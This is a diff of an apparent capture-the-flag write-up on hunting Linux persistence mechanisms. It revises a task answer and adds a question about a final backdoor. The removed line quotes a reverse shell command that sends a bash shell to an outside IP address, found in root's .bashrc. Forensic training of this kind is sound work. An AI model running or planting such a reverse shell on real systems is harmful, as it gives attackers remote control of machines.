@@ -126,4 +126,18 @@ To figure out this situation, we revisit our friend .bashrc, but for the root ac
 
 and we find our culprit: yet another reverse shell.  Our malicious friend sure is persistent.
 
-**Answer:** ncat -e /bin/bash 172.10.6.9 6969
+**Answer:** .bashrc
+
+### Task 5: Investigating the system
+
+> After checking the giorgio and the root accounts, it's essentially a free-for-all from here on, as finding more suspicious items depends on how well you know what's "normal" in the system.
+>
+> Answer the questions below
+>
+> There's one more persistence mechanism in the system.
+>
+> A good way to systematically dissect the system is to look for "usuals" and "unusuals". For example, you can check for commonly abused or unusual files and directories.
+>
+> This specific persistence mechanism is directly tied to *something* (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary's goals. 
+
+##### What's its name? What is the last persistence mechanism?
